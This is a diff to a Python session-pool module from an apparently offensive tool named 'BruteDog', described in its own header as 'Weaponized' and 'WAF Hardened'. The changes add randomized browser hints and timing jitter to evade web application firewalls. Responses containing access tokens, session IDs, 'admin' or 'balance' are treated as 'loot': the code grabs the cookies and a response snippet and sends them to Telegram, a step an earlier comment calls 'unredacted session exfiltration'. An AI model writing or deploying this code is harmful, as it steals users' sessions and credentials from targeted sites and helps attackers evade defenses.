@@ -1,21 +1,29 @@
+#!/usr/bin/env python3
+"""
+SESSION_POOL.PY v8.5 — Persistent HTTP/2 Session, Cookie Jar & Multiplexed Request Pool (WAF Hardened)
+Features:
+- Manages persistent sessions, cookie jars, and headers across HTTP/2 multiplexed requests to prevent session drops
+- Weaponized with automatic CSRF synchronization, wrapper request handlers, and behavioral jitter
+- Real-time asynchronous Telegram notification dispatch and centralized session telemetry
+"""
 import httpx
 import logging
+import asyncio
 from typing import Dict, Any, Optional, Union
 
-# Import centralized Telegram broadcaster for unredacted session exfiltration
+# Import centralized Telegram broadcaster and behavioral mimicry
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 logger = logging.getLogger("BruteDog.SessionPool")
 
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
     try:
-        import asyncio
         loop = asyncio.get_running_loop()
         loop.create_task(send_telegram_alert(loot_type, details))
     except RuntimeError:
         try:
-            import asyncio
             asyncio.run(send_telegram_alert(loot_type, details))
         except Exception:
             pass
@@ -32,14 +40,16 @@ class PersistentSessionPool:
         self.verify_ssl = verify_ssl
         self.http2 = http2
         
-        # Initialize a shared cookie jar and headers
+        # Initialize a shared cookie jar and headers with randomized browser hints
         self.cookie_jar = httpx.Cookies()
         self.default_headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
             "Accept": "application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5",
-            "X-Requested-With": "XMLHttpRequest"
+            "X-Requested-With": "XMLHttpRequest",
+            "Cache-Control": "no-cache"
         }
+        self.default_headers.update(get_randomized_hints())
         logger.info(f"[+] Initialized PersistentSessionPool for target: {self.base_url} (HTTP/2: {self.http2})")
 
     def update_headers(self, new_headers: Dict[str, str]) -> None:
@@ -104,8 +114,10 @@ class PersistentSessionPool:
     def request(self, method: str, path: str, payload: Optional[Dict[str, Any]] = None, timeout: float = 10.0) -> tuple:
         """
         Unified wrapper method used by crawlers and assessment engines to fire requests 
-        while auto-syncing cookies and returning standardized (status, headers, body) tuples.
+        while applying behavioral jitter, auto-syncing cookies, and returning standardized tuples.
         """
+        apply_behavioral_jitter()
+        
         clean_path = path if path.startswith("/") else f"/{path}"
         url = clean_path if clean_path.startswith("http") else clean_path
         
@@ -129,18 +141,21 @@ class PersistentSessionPool:
                 if set_cookie:
                     self.sync_cookies(set_cookie)
 
-                # Check for high-value authentication or session leakage in response
-                body_lower = resp.text.lower()
-                if resp.status_code in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin"]):
+                # Check for high-value authentication or session leakage in response, avoiding SPA false positives
+                body = resp.text
+                body_lower = body.lower()
+                is_spa_shell = 'div id="root"' in body_lower or 'div id="__next"' in body_lower or len(body.strip()) < 150
+                
+                if resp.status_code in [200, 201, 302] and not is_spa_shell and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin", "balance"]):
                     session_loot = {
                         "url": f"{self.base_url}{url}",
                         "status": resp.status_code,
                         "cookies": dict(self.cookie_jar),
-                        "response_snippet": resp.text[:300]
+                        "response_snippet": body[:300]
                     }
                     broadcast_tg_alert_sync("Session Pool Loot Captured", session_loot)
 
-                return resp.status_code, dict(resp.headers), resp.text
+                return resp.status_code, dict(resp.headers), body
             except Exception as e:
                 logger.error(f"[-] Request failed for {method} {url}: {e}")
                 return 0, {}, str(e)
